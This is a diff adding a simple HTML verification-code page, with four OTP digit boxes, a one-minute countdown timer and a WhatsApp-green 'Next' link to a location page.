@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+  <title>Verify Code</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0;
+    }
+    
+    .container {
+        background-color: white;
+        padding: 20px;
+        border-radius: 10px;
+        text-align: center;
+        max-width: 400px;
+        width: 100%;
+        height: 94vh;
+    }
+
+    h1 {
+        color: #333;
+      margin-bottom: 10px;
+      font-family: Poppins;
+      font-size: 25px;
+      font-weight: 600;
+      margin-top: 0;
+    }
+
+    h3 {
+        color: #666;
+      margin-bottom: 10px;
+      font-family: Poppins;
+      font-size: 16px;
+      font-weight: 300;
+      margin-bottom: 90px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+
+    .otp-inputs input {
+      width: 50px;
+      height: 50px;
+      font-size: 24px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .timer {
+      font-size: 16px;
+      margin:90px 0 45px 0;
+      color: #555;
+    }
+
+    .whatsapp-btn {
+      padding: 12px;
+      width: 94%;
+      background-color: #25D366;
+      color: rgb(0, 0, 0);
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      display: block;
+      text-decoration: none;
+    }
+
+  
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Enter the code</h1>
+    <h3>We have sent a verification code to your number </h3>
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" oninput="moveToNext(this, 0)">
+      <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
+      <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
+      <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
+    </div>
+
+    <div class="timer" id="timer">01:00</div>
+
+    <a href="/location.html" target="_blank" class="whatsapp-btn">Next
+      </a>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.otp-inputs input');
+
+    function moveToNext(input, index) {
+      if (input.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    }
+
+    function startCountdown(duration) {
+      let timer = duration, minutes, seconds;
+      const display = document.getElementById('timer');
+
+      const countdown = setInterval(() => {
+        minutes = Math.floor(timer / 60);
+        seconds = timer % 60;
+
+        display.textContent = 
+          `${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+
+        if (--timer < 0) {
+          clearInterval(countdown);
+          display.textContent = "Code expired";
+        }
+      }, 1000);
+    }
+
+    function openWhatsApp() {
+      window.open("https://wa.me/", "_blank");
+    }
+
+    // Start 1-minute countdown on page load
+    window.onload = () => startCountdown(60);
+  </script>
+
+</body>
+</html>
